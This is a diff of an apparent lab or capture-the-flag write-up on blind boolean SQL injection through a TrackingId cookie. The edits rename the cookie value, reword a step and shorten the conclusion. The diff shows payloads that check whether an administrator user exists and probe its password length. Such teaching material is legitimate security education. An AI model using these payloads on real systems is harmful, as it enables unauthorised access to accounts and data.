@@ -18,10 +18,9 @@ The challenge description reveals that the application uses the `TrackingId` coo
 
    ![Repeater](./Screenshots/Repeater.png)
 
-2. Since the cookie value is part of the query, we can attempt SQL injection. Removing it may cause an error, so we modify it instead:
-
+2. Since the cookie value is embedded in the query, we can attempt SQL injection. Removing it entirely would trigger an error, as the query expects a specific value. Instead, we modify it to inject our payload:
    ```sql
-   TrackingId=xyz' AND '1'='1
+   TrackingId=GoldenDragon' AND '1'='1
    ```
 
    ![First Payload](./Screenshots/FirstPayload.png)
@@ -31,7 +30,7 @@ The challenge description reveals that the application uses the `TrackingId` coo
 3. Next, verify if the `administrator` user exists:
 
    ```sql
-   TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a
+   TrackingId=GoldenDragon' AND (SELECT 'a' FROM users WHERE username='administrator')='a
    ```
 
    ![Second Payload](./Screenshots/SecondPayload.png)
@@ -41,7 +40,7 @@ The challenge description reveals that the application uses the `TrackingId` coo
 4. Now, determine the password length:
 
    ```sql
-   TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password) > 1)='a
+   TrackingId=GoldenDragon' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password) > 1)='a
    ```
 
    ![Length Check](./Screenshots/Length.png)
@@ -111,8 +110,6 @@ This script rapidly extracts the password, completing the attack in under a minu
 
 ---
 
-## Conclusion
-
-By leveraging SQL injection techniques, we successfully extracted the administrator password using boolean-based inference. While Burp Suite’s Intruder is useful, a Python script significantly speeds up the process.
+Burp Suite’s Intruder is definetely useful, but a Python script significantly speeds up the process.
 
 Happy hacking!
